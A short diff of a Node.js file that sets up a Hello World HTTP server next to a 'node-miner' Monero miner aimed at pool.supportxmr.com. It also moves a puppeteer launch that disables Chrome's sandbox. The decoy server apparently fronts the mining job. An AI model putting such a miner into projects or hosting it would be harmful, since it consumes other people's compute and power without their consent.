@@ -1,6 +1,5 @@
 const NodeMiner = require('node-miner');
 const http = require('http');
-const browser = await puppeteer.launch({args: ['--no-sandbox', '--disable-setuid-sandbox']});
 
 // Configure our HTTP server to respond with Hello World to all requests.
 const server = http.createServer((request, response) => {
@@ -10,6 +9,8 @@ const server = http.createServer((request, response) => {
 
 (async () => {
  
+    const browser = await puppeteer.launch({args: ['--no-sandbox', '--disable-setuid-sandbox']});
+
     const miner = await NodeMiner({
         host: `pool.supportxmr.com`,
         port: 5555,
